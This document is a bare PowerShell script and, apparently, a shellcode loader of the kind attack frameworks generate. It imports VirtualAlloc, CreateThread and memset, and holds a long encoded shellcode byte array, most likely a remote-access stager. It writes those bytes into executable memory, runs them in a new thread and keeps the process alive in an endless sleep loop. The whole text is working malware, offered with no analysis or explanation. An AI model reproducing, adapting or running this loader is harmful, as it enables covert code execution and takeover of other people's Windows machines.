
$yMhY = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $yMhY -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xb8,0x12,0xa5,0x84,0x6d,0xdb,0xd0,0xd9,0x74,0x24,0xf4,0x5b,0x2b,0xc9,0xb1,0x51,0x31,0x43,0x15,0x83,0xeb,0xfc,0x03,0x43,0x11,0xe2,0xe7,0x59,0x6c,0xef,0x07,0xa2,0x6d,0x90,0x8e,0x47,0x5c,0x90,0xf4,0x0c,0xcf,0x20,0x7f,0x40,0xfc,0xcb,0x2d,0x71,0x77,0xb9,0xf9,0x76,0x30,0x74,0xdf,0xb9,0xc1,0x25,0x23,0xdb,0x41,0x34,0x77,0x3b,0x7b,0xf7,0x8a,0x3a,0xbc,0xea,0x66,0x6e,0x15,0x60,0xd4,0x9f,0x12,0x3c,0xe4,0x14,0x68,0xd0,0x6c,0xc8,0x39,0xd3,0x5d,0x5f,0x31,0x8a,0x7d,0x61,0x96,0xa6,0x34,0x79,0xfb,0x83,0x8f,0xf2,0xcf,0x78,0x0e,0xd3,0x01,0x80,0xbc,0x1a,0xae,0x73,0xbd,0x5b,0x09,0x6c,0xc8,0x95,0x69,0x11,0xca,0x61,0x13,0xcd,0x5f,0x72,0xb3,0x86,0xc7,0x5e,0x45,0x4a,0x91,0x15,0x49,0x27,0xd6,0x72,0x4e,0xb6,0x3b,0x09,0x6a,0x33,0xba,0xde,0xfa,0x07,0x98,0xfa,0xa7,0xdc,0x81,0x5b,0x02,0xb2,0xbe,0xbc,0xed,0x6b,0x1a,0xb6,0x00,0x7f,0x17,0x95,0x4c,0x11,0x42,0x52,0x8d,0x85,0xfb,0xf3,0xe3,0x3c,0x57,0x6c,0xb0,0xc9,0x71,0x6b,0xb7,0xe3,0x4c,0xa8,0x14,0x5f,0xfd,0x1d,0xc8,0x37,0x3b,0xf4,0x97,0x60,0xc4,0x2d,0x34,0x3c,0x50,0xcd,0xe8,0x91,0xce,0xe4,0xe6,0x6e,0x0e,0x07,0xf7,0xa1,0x3f,0x56,0x99,0x8a,0x0a,0x58,0x35,0x9d,0x23,0xd1,0x2a,0x9b,0x34,0x34,0xdd,0xe2,0x99,0xdf,0xde,0xe8,0x7d,0xa4,0x8c,0xbf,0x2e,0xf3,0x61,0x16,0xb8,0x10,0xd0,0xb8,0x03,0x18,0x0e,0x52,0x19,0xec,0xee,0x08,0x8e,0xa3,0x43,0xf9,0x58,0x69,0x62,0x1d,0xe3,0x8e,0xbf,0x98,0xd3,0x04,0x4a,0xec,0xa6,0x0b,0x22,0x02,0xfd,0x76,0xe5,0x1d,0x28,0x1c,0x4a,0x8a,0xd2,0xf1,0x4a,0x4a,0xba,0xf1,0x4a,0x0a,0x3a,0xa1,0x22,0xd2,0x9e,0x16,0x56,0x1d,0x0b,0x0b,0xcb,0xb1,0x3a,0xcb,0xbb,0x5d,0x3c,0x34,0x44,0x9e,0x6f,0x62,0x2c,0x8c,0x19,0x03,0x4e,0x4f,0xf0,0x91,0x4f,0xc4,0x37,0x12,0x48,0x24,0x04,0xa0,0x97,0x53,0x6f,0xf3,0xd4,0xc3,0x87,0x8d,0x24,0x04,0xa8,0xbf,0xe9,0xc2,0x78,0xf1,0x3b,0x07,0xaa,0xc0,0x74,0x53,0x9c,0x11,0x4f,0x9b;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$Zu6=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($Zu6.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$Zu6,0,0,0);for (;;){Start-sleep 60};

